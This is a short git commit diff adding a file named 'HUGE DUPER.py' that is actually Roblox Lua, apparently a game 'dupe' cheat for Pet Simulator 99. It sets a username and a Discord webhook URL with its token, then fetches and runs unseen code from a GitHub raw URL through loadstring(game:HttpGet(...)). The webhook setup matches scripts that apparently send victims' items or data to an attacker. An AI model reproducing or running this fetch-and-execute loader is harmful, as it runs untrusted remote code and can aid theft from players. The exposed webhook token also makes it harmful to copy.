238c1df25e802a53a1710490f30eb8f01a239075
LOLSIGMABOY <SMARTSEIVANGHAO@GMAIL.COM>
2025-04-14 18:05:18 +0530

    Add files via upload

---
+++ HUGE DUPER.py
@@ -0,0 +1,4 @@
+Username = smartnoobyt123123
+Webhook = https://discord.com/api/webhooks/1361269826139590807/itYT27YaMteaWvlyxKiCwul45rrzX51wlCqJfv4kvEmXMlSoqKn-WsetEaYJTclJXvGs
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
